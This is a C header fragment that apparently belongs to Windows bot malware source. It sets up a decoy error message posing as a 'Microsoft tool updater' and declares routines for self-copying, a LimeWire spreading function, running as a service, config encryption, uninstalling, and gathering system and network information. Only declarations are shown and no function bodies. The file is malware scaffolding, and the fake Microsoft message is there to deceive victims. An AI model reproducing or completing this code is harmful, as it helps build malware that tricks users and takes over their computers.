const BOOL errmsg = TRUE;
const char errtxt[] = "Microsoft tool updater can not be run on this version of windows."; 
const char errtbr[] = "ERROR"; 
const int errbxtype = 48;
BOOL LimeWire(void);
/*mod above*/

int numtok(const char *str, char chr);

int rrand(int min, int max);

int cpuspeed();

unsigned long resolvehost(const char *host);

unsigned __int64 cyclecount();

char *gettok(const char *str, int tok, char chr);

char *resolveip(unsigned long ip);

char *localip(SOCKET sock);

char *sysinfo();

char *netinfo();

char *decryptsvc();

bool isip(const char *address);

void syscopy();

void clonecheck();

void uninstall();

void decryptconfig();

void decrypt(char *buf, int bufsiz, const char *str, const char *key);

void encrypt(char *buf, int bufsiz, const char *str, const char *key);

void svc_main();

void svc_ctrlhandler(unsigned long opcode); 

void WINAPI svc_start(DWORD argc, LPTSTR *argv);
